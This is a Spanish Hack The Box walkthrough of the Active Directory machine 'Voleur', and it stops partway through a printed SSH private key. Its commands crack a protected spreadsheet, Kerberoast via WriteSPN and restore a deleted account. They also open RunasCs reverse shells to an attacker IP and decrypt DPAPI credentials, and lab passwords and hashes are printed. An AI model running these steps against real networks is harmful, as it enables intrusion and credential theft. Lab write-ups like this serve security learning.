___
Tags: #medium #Voleur #AD #Kerberoasting #writespn
___
# Voleur

## Información General

**- Dificultad:** Medium <br>
**- Sistema operativo:** Windows <br>
**- Fecha de resolución:** 14/08/2026 <br>
**- Enlace:** [Voleur](https://app.hackthebox.com/machines/Voleur) <br>

## Usuarios identificados

| **Usuario**       | **Importancia y Rol en la Escalada de Privilegios**                                                                                                                                                                       |
| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **ryan.naylor**   | **Punto de entrada inicial:** Cuenta proporcionada al inicio con la pre-autenticación de Kerberos deshabilitada, lo que permite consultar recursos por SMB y leer el documento cifrado de la carpeta `IT`.                |
| **svc_ldap**      | **Cuenta de servicio clave:** Contiene permisos `WriteSPN` sobre la cuenta `svc_winrm` y pertenece al grupo `restore_users`, lo que permite modificar atributos del directorio y restaurar la cuenta borrada `Todd.Wolfe` |
| **svc_winrm**     | **Cuenta de acceso remoto:** Utilizada para obtener la primera shell interactiva mediante WinRM tras realizar un ataque de Kerberoasting al explotar el permiso `WriteSPN`.                                               |
| **Todd.Wolfe**    | **Usuario eliminado recuperado:** Cuenta previamente eliminada cuyas credenciales y datos de DPAPI fueron recuperados de la carpeta compartida, permitiendo desencriptar credenciales almacenadas.                        |
| **jeremy.combs**  | **Usuario de soporte técnico (Tercera línea):** Integrante del grupo con acceso a directorios que contienen recursos críticos y la llave privada SSH.                                                                     |
| **svc_backup**    | **Cuenta de servicio de respaldos:** Permite el acceso por SSH en el puerto 2222 a los ficheros de copias de seguridad del sistema operativo y Active Directory (`NTDS.dit`, `SYSTEM`, `SECURITY`).                       |
| **Administrator** | **Cuenta de máximo privilegio:** Objetivo final de la máquina, alcanzado mediante un volcado offline de hashes (`secretsdump.py`) utilizando los ficheros de respaldo para autenticarse por WMI/SMB.                      |

## Listado de Vulnerabilidades Identificadas

A continuación, se presenta el listado de vulnerabilidades y configuraciones inseguras identificadas a lo largo de la ruta de ataque para alcanzar la cuenta de `Administrator`:

| **Vulnerabilidad / Configuración Insegura**                         | **Descripción y Explotación en la Ruta**                                                                                                                                                                                                  |
| ------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Kerberos Pre-authentication Disabled (AS-REP Roasting)**          | Configuración presente en la cuenta inicial de `ryan.naylor` que permite solicitar el ticket de autenticación sin requerir contraseña, facilitando la obtención de información preliminar de la red.                                      |
| **Permisos de Escritura de SPN (WriteSPN / GenericAll)**            | Vulnerabilidad en los permisos del directorio activo donde la cuenta `svc_ldap` tiene control sobre `svc_winrm`, permitiendo registrar un SPN malicioso para realizar un ataque de Kerberoasting.                                         |
| **Kerberoasting**                                                   | Explotación del SPN asignado para solicitar un ticket de servicio cifrado débilmente, permitiendo crackear la contraseña de la cuenta `svc_winrm` fuera de línea.                                                                         |
| **Exposición de Archivos Sensibles y Credenciales DPAPI**           | Presencia de documentos y carpetas compartidas con contraseñas cifradas o datos de la API de protección de datos de Windows (DPAPI), lo que permitió recuperar credenciales de usuarios eliminados como `Todd.Wolfe`.                     |
| **Recuperación de Usuarios Eliminados**                             | Mala práctica en la gestión de objetos de Active Directory que permitió al grupo `restore_users` restaurar cuentas previamente dadas de baja y extraer su información histórica.                                                          |
| **Exposición de Llaves Privadas SSH**                               | Almacenamiento inseguro de llaves privadas SSH en directorios accesibles por usuarios de soporte (`jeremy.combs`), permitiendo conexiones no autorizadas a servicios expuestos.                                                           |
| **Servicio de Respaldos Vulnerable (Acceso SSH Alternativo)**       | Exposición del servicio SSH en un puerto no estándar (`2222`) asociado a la cuenta de servicio `svc_backup`, el cual otorgaba acceso directo a los ficheros críticos del sistema.                                                         |
| **Exposición de Archivos del Sistema (NTDS.dit / Secrets Dumping)** | Disponibilidad de copias de seguridad de Active Directory (`NTDS.dit`, `SYSTEM`, `SECURITY`) accesibles mediante la cuenta de respaldo, permitiendo el volcado offline de todos los hashes de la red para comprometer al `Administrator`. |

## Reconocimiento

**HTB** nos proporciona la ip de la máquina objetivo **10.129.232.130**

**Información de la máquina** --> Como es común en los pentests de Windows de la vida real, iniciará el cuadro Voleur con las credenciales para la siguiente cuenta: **ryan.naylor** / **HollowOct31Nyt**

### Ping

Dependiendo del resultado podemos deducir si es una máquina linux o window, por ejemplo:

```
ping -c 1 10.129.232.130
```

<p align="center">
<img src="images/ping.png" width="600" alt="Resultado de Nmap">
</p>

**Su ttl es 128. Por tanto, es Windows**

## Enumeración

### Escaneo de puertos abiertos

#### Escaneo de puerto TCP

El comando que uso con nmap es:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -Pn 10.129.232.130
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-14 17:52:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
54739/tcp open  msrpc         Microsoft Windows RPC
56528/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
56529/tcp open  msrpc         Microsoft Windows RPC
56531/tcp open  msrpc         Microsoft Windows RPC
56558/tcp open  msrpc         Microsoft Windows RPC
```

| Open port | Service      | Version                                 |
| --------- | ------------ | --------------------------------------- |
| 53        | domain       | Simple DNS Plus                         |
| 88        | kerberos-sec | Microsoft Windows Kerberos              |
| 135       | msrpc        | Microsoft Windows RPC                   |
| 139       | netbios-ssn  | Microsoft Windows netbios-ssn           |
| 389       | ldap         | Microsoft Windows Active Directory LDAP |
| 593       | ncacn_http   | Microsoft Windows RPC over HTTP 1.0     |
| 2222      | ssh          | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11        |
| 3268      | ldap         | Microsoft Windows Active Directory LDAP |
| 9389      | mc-nmf       | .NET Message Framing                    |

### SMB 

El siguiente comando **extrae los nombres de dominio/host de la IP vía SMB y los agrega automáticamente a tu archivo `/etc/hosts`** para que puedas navegar o atacar usando sus nombres de dominio.

```
sudo netexec smb 10.129.232.130 --generate-hosts-file /etc/hosts
```

El usuario proporcionado por **htb** hay que corregir el **STATUS_NOT_SUPPORTED**  para que nos sirve en smb.

```
netexec smb voleur.htb -u ryan.naylor -p 'HollowOct31Nyt'
```

<p align="center">
<img src="images/ryannaylor.png" width="600" alt="Resultado de Nmap">
</p>

Para ello hay que actualizar el tiempo de la maquina objetivo con la maquina atacante.

```
sudo ntpdate voleur.htb
```

<p align="center">
<img src="images/time.png" width="600" alt="Resultado de Nmap">
</p>

```
netexec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -d 'voleur.htb' -k --kdcHost 10.129.232.130
```

<p align="center">
<img src="images/smb.png" width="600" alt="Resultado de Nmap">
</p>

```
netexec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -d 'voleur.htb' -k --kdcHost 10.129.232.130 --shares
```

<p align="center">
<img src="images/it.png" width="600" alt="Resultado de Nmap">
</p>

#### Conseguir ticket krb5

```
netexec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -d 'voleur.htb' -k --kdcHost 10.129.232.130 --generate-krb5-file krb5.conf
```

<p align="center">
<img src="images/krb5.conf.png" width="600" alt="Resultado de Nmap">
</p>

Copio ese ticket en /etc/krb5.conf

```
sudo cp krb5.conf /etc/krb5.conf
```

El comando **`kinit ryan.naylor@VOLEUR.HTB`** sirve para **autenticarte en un dominio de Active Directory usando el protocolo Kerberos** y solicitar un **TGT** (_Ticket Granting Ticket_).

```
kinit ryan.naylor@VOLEUR.HTB
klist
```

<p align="center">
<img src="images/klist.png" width="600" alt="Resultado de Nmap">
</p>

#### Creando montura

Para traerme la carpeta de que permite leer que es **IT** haremos lo siguiente:

```
sudo mkdir smb

sudo mount -t cifs //dc.voleur.htb/IT smb -o cruid=$USER,sec=krb5,user=ryan.naylor,domain=VOLEUR.HTB

ls -la smb

tree
```

<p align="center">
<img src="images/xlsx.png" width="600" alt="Resultado de Nmap">
</p>

El resultado **`CDFV2 Encrypted`** (Compound Document Format Version 2) nos confirma que el archivo `.xlsx` no es un documento de Excel normal en formato OpenXML, sino que está **protegido con contraseña / cifrado**.

```
file Access_Review.xlsx 
```

> Access_Review.xlsx: CDFV2 Encrypted

#### Crackear archivo Access_Review.xlsx 

Copio el **.xlsx** en mi carpeta de trabajo

```
cp '/home/dani/Escritorio/MACHINES/medium/voleur/smb/First-Line Support/Access_Review.xlsx' .
```

Usare el script **office2john.py** para obtener su hash y luego conseguir su contraseña

```
sudo python3 /usr/share/john/office2john.py Access_Review.xlsx | tee Access_Review.xlsx.hash 
```

> Access_Review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c

```
hashcat Access_Review.xlsx.hash /usr/share/wordlists/rockyou.txt --user 
```

> football1

Lo he abierto en mi ordenador, fuera de kali.

<p align="center">
<img src="images/excel.png" width="600" alt="Resultado de Nmap">
</p>

#### Cuentas de Usuario

| **Usuario**       | **Permisos / Rol**      | **Observaciones Clave**                                                                                                                  |
| ----------------- | ----------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| **Ryan.Naylor**   | SMB                     | Tiene la **Pre-Autenticación de Kerberos deshabilitada** (`Pre-Auth disabled`). Esto lo hace susceptible a ataques de _AS-REP Roasting_. |
| **Marie.Bryant**  | SMB                     | Técnico de soporte de primera línea.                                                                                                     |
| **Lacey.Miller**  | Remote Management Users | Pertenece al grupo que permite administración remota (WinRM/PSRemoting).                                                                 |
| **~Todd.Wolfe~**  | _(Tachado)_             | Cuenta eliminada, pero deja anotada una contraseña anterior: `NightT1meP1dg3on14`.                                                       |
| **Jeremy.Combs**  | Remote Management Users | Tiene acceso a una carpeta compartida llamada `Software`.                                                                                |
| **Administrator** | Domain Admin            | Cuenta de administración del dominio.                                                                                                    |

#### Cuentas de Servicio (_Service Accounts_)

| **Cuenta de Servicio** | **Servicio / Función**               | **Contraseña / Estado** | **Notas**                                                     |
| ---------------------- | ------------------------------------ | ----------------------- | ------------------------------------------------------------- |
| **`svc_ldap`**         | Servicios LDAP                       | `M1XyC9pW7qT5Vn`        | Credenciales expuestas en texto plano                         |
| **`svc_iis`**          | Administración de servidor Web (IIS) | `N5pXyW1VqM7CZ8`        | Credenciales expuestas en texto plano                         |
| **`svc_backup`**       | Copias de seguridad de Windows       | _No especificada_       | Indica consultar con el usuario **Jeremy**                    |
| **`svc_winrm`**        | Gestión remota (WinRM)               | _No especificada_       | Indica consultar con **Lacey**, quien la cambió recientemente |

```
netexec smb dc.voleur.htb -u 'svc_iis' -p 'N5pXyW1VqM7CZ8' -d 'voleur.htb' -k --kdcHost 10.129.232.130
```

<p align="center">
<img src="images/svciss.png" width="600" alt="Resultado de Nmap">
</p>

```
netexec smb dc.voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -d 'voleur.htb' -k --kdcHost 10.129.232.130
```

<p align="center">
<img src="images/svcldap.png" width="600" alt="Resultado de Nmap">
</p>

**Pistas de permisos:** Tanto **Lacey Miller** como **Jeremy Combs** tienen permisos de administración remota (`Remote Management Users`), lo que suele habilitar conexiones por WinRM.

## Explotación

### BloodHound

```
bloodhound-python -d 'voleur.htb' -u 'ryan.naylor' -p 'HollowOct31Nyt' -gc 'voleur.htb' -dc 'dc.voleur.htb' -ns 10.129.232.130 -c all --zip
```

Tanto el usuario **Jeremy.Combs** y **svc_winrm** están dentro del grupo **remote management users** que tiene conexión remota.

<p align="center">
<img src="images/Voleurremote management users.png" width="600" alt="Resultado de Nmap">
</p>

Me doy cuenta que unos de las cuentas de servicio que tengo **svc_ldap** tiene permiso **WriteSPN** sobre **SVC_WINRM**. El impacto directo en la seguridad al tener habilitado el permiso **WriteSPN** es que habilita a cualquier usuario autenticado del dominio a solicitar un ticket de servicio (TGS) firmado con la clave cifrada de la cuenta objetivo, lo que expone su contraseña a ataques de fuerza bruta fuera de línea (_Kerberoasting_) si esta no es lo suficientemente compleja. 

<p align="center">
<img src="images/writespn.png" width="600" alt="Resultado de Nmap">
</p>

### Obtención de ticket kerbero para el usuario svc_winrm explotando el permiso WriteSPN

[BloodyAD](https://github.com/ShutdownRepo/targetedKerberoast) es una herramienta en Python diseñada para interactuar con entornos de **Active Directory (AD)** a través de protocolos como LDAP y SMB. 

Su función principal es inspeccionar, agregar, modificar o eliminar objetos y permisos (ACLs) dentro del directorio activo de forma modular y rápida.

```
git clone https://github.com/CravateRouge/bloodyAD.git
```

Preparo el entorno virtual e instalo **BloodyAD**

```
python3 -m venv venv

source venv/bin/activate

pip install .
```

la cuenta `svc_ldap` le pide al Controlador de Dominio (`dc.voleur.htb`) que le asigne el identificador de servicio `http/whatever` al atributo `servicePrincipalName` de la cuenta `svc_winrm`.

Esto funciona **únicamente si la cuenta `svc_ldap` tiene permiso** `writeSPN` sobre la cuenta `svc_winrm` dentro de las listas de control de acceso (ACLs) de Active Directory.

```
bloodyAD -d voleur.htb -k --host dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn set object svc_winrm servicePrincipalName -v 'http/whatever'
```

> [+] svc_winrm's servicePrincipalName has been updated

A continuación, me dispongo a obtener el hash del usuario **svc_winrm**

```
netexec ldap dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k --kerberoasting svc_winrm.hashLDAP
```

<p align="center">
<img src="images/kerberoasting.png" width="600" alt="Resultado de Nmap">
</p>

```
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb\svc_winrm*$06539acf0706d1de5402af0aa845ce9a$3fe3c20765ca06767eb64f05110eb4039e6cee01b48a47805c48f08a29a36335470e1bf713e43d3e1e5834e8bb2d84590af51cb3edb5bc81f889cdb5654b2f8dab0f0610f74954d33b4cf6fe913b7ce22f86fc5c408785e3b619b4ead4a138441516cbbb0a12a3fe66f47bb1d1e97866b6352f4e44ca647008f3c946ce86970d1112500aeb559ecd547c23eda81240078e0208b1fcb7eb32158bac803add6be70eff830bf5229d98f2b88a5d2a7ff894668976e78299ac7d9b882590a620315c45a7c0d3bffedb21262a743909e88819142dfc5a325c76f1e3d174fcff13f1c00c644464095be91dafd5d34f33da0bb008b18f3606060620790a01d39a593513aedf4bd48bf996ef9dbdeb61def689c3170900503185fe5cf44450aad88c584a280b1951fc089702d3f4b5143aeb294b314d993c306eb535f3ca13b2e085d5079fe9e01aedb585640c7b7393842eedb96870097c1a754cff2bed02debfaf89af5132c208b99aaa01aab2e12dc7b37bac37305147e9ba2dbd0429ff52ada28b155272b5f68f612248be56a524df021e0f5d0bd6b57fe3dd7bf6180eabdbe85757547413636f21814a694637ed3afb98d97aa87d675e32eb1d365903f3c2f6a505f3aa9becdd251a0e4ae6135f0ab10ce47e144712253a85d733633bbba1b624476954ce68c652e21ed5ab0e830d575011801cd036da69eb0442f7f65006e49b13daea6fc0b6cd106fcefc9040f0d1159f0f76a374382192c564c24a3b605cae917ee4097014c26c2193b60cb9aa3dded8f9a60e2fe6fce8bf5d1747bea3668121044f819789ab08dfde8ed23c2d623d5fb143d90fa0b22ca56532f94695d4d8caf1e5eceb70e01702ea2f209eec06b239a3c92ba8e0adc0e21bdce0722b305dc825d90a36f5695f5e2f5d9e2dd43cdfd7d147883ea793f0d150b2747f99d76ed56617fdeebf67f669432747a5fb4df6ceea267b358d844d66100d5946cc009ec799d8fcf819fe97263ce6ac5e850c75d5c1e9b2ed14d95c3d0d9ed62d91cb6392288c55668d5e4cf0b45a928249b41a583df0d5a02cca007b3adae36d80478d22c0b1a5fa61d00643d34100e8f4eed77fcb198eb78e025f382fcfacc642b2b0ac19dead1cc75158151d475d08a1b4992f3d76c5de735be2bed789271dc242b6dd962387ff17eea82ad53544f1eb6a2d72b1acac90407258f03bc5786694e0e35e4db04e979527d39ed856cac874b6d52afa3239b3134fb6455c40704216074b7b5ce5b8347f0bdc06ee855b115af94f665f19bca0a67bd6dd928f530acb4cb2363a7b8dc73fb8878da53500ea433797afe2f5757c87fc9fa9669598f7d1242717952f1e81a0c798f8306e153d03bbe21a3b9719db49063dda44b12a07c7caf19e471b50acf7a064a41256d44f51eda61733f50c6aa8b2d99bdd1661cfd2f7f63378b29dc0eb7c79f673e1441ee12e37e6637675
```

Este hash lo guardo como **hashsvc.winrm**

```
hashcat hashsvc.winrm /usr/share/wordlists/rockyou.txt
```

> AFireInsidedeOzarctica980219afi

Cred --> **svc_winrm**:**AFireInsidedeOzarctica980219afi**

Uso la herramienta **netexec** para validar las credenciales del usuario **svc_winrm**

```
netexec smb dc.voleur.htb -u 'svc_winrm' -p 'AFireInsidedeOzarctica980219afi' -d 'voleur.htb' -k --kdcHost 10.129.232.130
```

<p align="center">
<img src="images/svc_wirm.png" width="600" alt="Resultado de Nmap">
</p>

Cuando ejecutas `kinit`, le estás pidiendo al Controlador de Dominio (el servidor que gestiona las identidades) que te entregue un **TGT (Ticket Granting Ticket)**.

```
kinit svc_winrm@VOLEUR.HTB
klist
```

<p align="center">
<img src="images/klistsvc_winrm.png" width="600" alt="Resultado de Nmap">
</p>

A continuación, Evil-WinRM busca automáticamente el ticket Kerberos (TGT) activo que guardaste en tu sistema con el comando `kinit`. Como ya habías ejecutado `kinit` para el usuario `svc_winrm`, la herramienta reutilizó ese ticket (_Pass-the-Ticket_) para autenticarte sin pedir credenciales adicionales.

```
evil-winrm -i dc.voleur.htb -r voleur.htb
```

<p align="center">
<img src="images/user.txt.png" width="600" alt="Resultado de Nmap">
</p>

## Escalada de Privilegios

### Como obtener shell de Todd.Wolfe

#### BloodHound

Teniendo en cuenta que en el **Excel** nos encontramos un usuario eliminado en **BloodHound** investigo si hay un grupo para recuperar usuario.... y premio.

El usuario **svc_ldap** está dentro del grupo **restore_users** pero el usuario **svc_ldap** no puede iniciar sesion mediante **wirm** Por tanto, lo haremos mediante la herramienta [runa](https://github.com/antonioCoco/RunasCs/releases/tag/v1.5)

<p align="center">
<img src="images/premiooo.png" width="600" alt="Resultado de Nmap">
</p>

#### runas

Al descomprimir el **.zip** obtendremos el archivo **RunasCs.exe** Este **.exe** nos los trasladamos a nuestra sesión **svc_wirm** 

```
upload RunasCs.exe
```

**RunasCs.exe** Permite conseguir una sesión interactiva (Reverse Shell) de un usuario del que tienes credenciales, pero que **tiene bloqueado el acceso remoto** (no puede entrar por WinRM, RDP, etc.).

```
.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.14.188:443
```

Pero antes tenemos que preparar el puerto de escucha:

```
nc -lvnp 443
```

<p align="center">
<img src="images/session svc_ldap.png" width="600" alt="Resultado de Nmap">
</p>

#### Sesión con svc_ldap

Este comando de PowerShell sirve para **buscar y listar objetos que han sido borrados de Active Directory** (la Papelera de reciclaje de AD), excluyendo el contenedor principal de la papelera en sí.

```
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
```

<p align="center">
<img src="images/delusuario.png" width="600" alt="Resultado de Nmap">
</p>

Este comando para restaurar el usuario que ha sido eliminado

```
Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db 
```

> Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db

En mi kali compruebo la validación de este usuario recuperado, recuerda que en el **Excel** tenía apuntado sus credenciales

```
netexec smb dc.voleur.htb -u 'Todd.Wolfe' -p 'NightT1meP1dg3on14' -d 'voleur.htb' -k --kdcHost 10.129.232.130
```

<p align="center">
<img src="images/tooddddwolfe.png" width="600" alt="Resultado de Nmap">
</p>

En la sesion de **svc_winrm** haremos el siguiente comando:

```
.\RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.14.188:4443
```

pero antes preparamos el puerto de escucha:

```
rlwrap -cAr nc -lvnp 4443
```

<p align="center">
<img src="images/toooodddwolfe.png" width="600" alt="Resultado de Nmap">
</p>

### Como obtener shell de Jeremy.Combs

#### Enum

Quiero saber en que grupo se encuentra **todd.wolfe**. Se encuentra en el grupo `Second-Line Technicia*Domain Users`

```
net user todd.wolfe
```

<p align="center">
<img src="images/grouppp.png" width="600" alt="Resultado de Nmap">
</p>

Resulta que dentro de esta carpeta `C:\it\Second-Line Support` tengo permiso para acceder. Investigando me encuentro el directorio antiguo de **todd.wolfe**

<p align="center">
<img src="images/directoriotw.png" width="600" alt="Resultado de Nmap">
</p>

Resulta que existe un usuario almacenado en `AppData`:

```
ls AppData\Roaming\Microsoft\Credentials
```

<p align="center">
<img src="images/usuarioalmacenadooo.png" width="600" alt="Resultado de Nmap">
</p>

Además, también está disponible la llave maestra.

```
ls AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110
```

<p align="center">
<img src="images/llavemaestra.png" width="600" alt="Resultado de Nmap">
</p>

#### Extracción

Creo que esta carpeta `IT` ya está compartida como una unidad SMB. Existe un script de reinicio, por lo que podría tener que volver a ejecutar `Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db` para reactivar la cuenta (Este comando se tendrá que realizar en la sesión del usuario **svc_ldap** ). Después, puedo conectarme al servicio SMB con `smbclient`:

```
smbclient -U 'voleur.htb/todd.wolfe%NightT1meP1dg3on14' --realm=voleur.htb //dc.voleur.htb/IT
```

El parámetro **`--realm`** se utiliza para especificar explícitamente el **Dominio Kerberos (Realm)** con el que te vas a comunicar.

Obtendré el credencial encriptado y la llave maestra:

```
get "Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3" 772275FAD58525253490A9B0039791D3
```

```
get "Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88" 08949382-134f-4c63-b93c-ce52efc0aa88
```

#### Recuperar credenciales

Usare el script [dpapi.py](https://github.com/fortra/impacket/blob/master/examples/dpapi.py) esta diseñada para interactuar, descifrar y explotar los secretos protegidos por el sistema **DPAPI (Data Protection API)** de Windows.

Este comando sirve para **desbloquear la llave maestra de seguridad de un usuario** usando su contraseña en texto plano.

```
chmod +x dpapi.py

dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
```

<p align="center">
<img src="images/key decrypted.png" width="600" alt="Resultado de Nmap">
</p>

Este comando sirve para **abrir y leer el contenido de un archivo de credenciales cifrado** (como los que guarda Windows cuando recuerdas una contraseña).

```
dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

<p align="center">
<img src="images/credcrakeada.png" width="600" alt="Resultado de Nmap">
</p>

#### Shell

El usuario **jeremy.combs** está habilitado para smb

```
netexec smb dc.voleur.htb -u 'jeremy.combs' -p 'qT3V9pLXyN7W4m' -d 'voleur.htb' -k --kdcHost 10.129.232.130
```

<p align="center">
<img src="images/jeremycombsss.png" width="600" alt="Resultado de Nmap">
</p>

```
kinit jeremy.combs@VOLEUR.HTB
klist
```

<p align="center">
<img src="images/jeremycombsticketkrb5.png" width="600" alt="Resultado de Nmap">
</p>

```
evil-winrm -i dc.voleur.htb -r voleur.htb
```

<p align="center">
<img src="images/jeremycombsevilrm.png" width="600" alt="Resultado de Nmap">
</p>

### Shell como svc_backup

#### Enumeración

En bloodHound me doy cuenta que el usuario **Jeremy.Combs** esta dentro del grupo **Third-Line TECHNICIANS**

<p align="center">
<img src="images/thirdline.png" width="600" alt="Resultado de Nmap">
</p>

Por tanto dentro de `C:\it\Third-Line Support>` me encuentro lo siguiente:

<p align="center">
<img src="images/noteeee.png" width="600" alt="Resultado de Nmap">
</p>

EL contenido de la nota dice:

```
Jeremy,

¡Estoy harto de la copia de seguridad de Windows! He configurado parcialmente WSL para ver si podemos usar alguna de las herramientas de copia de seguridad de Linux.

Por favor, revisa qué puedes configurar.

Gracias,

Administrador
```

#### SSH

Además, tenemos un **idrsa** bien jugoso. Recuerda que el puerto ssh se encuentra en el puerto 2222.

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
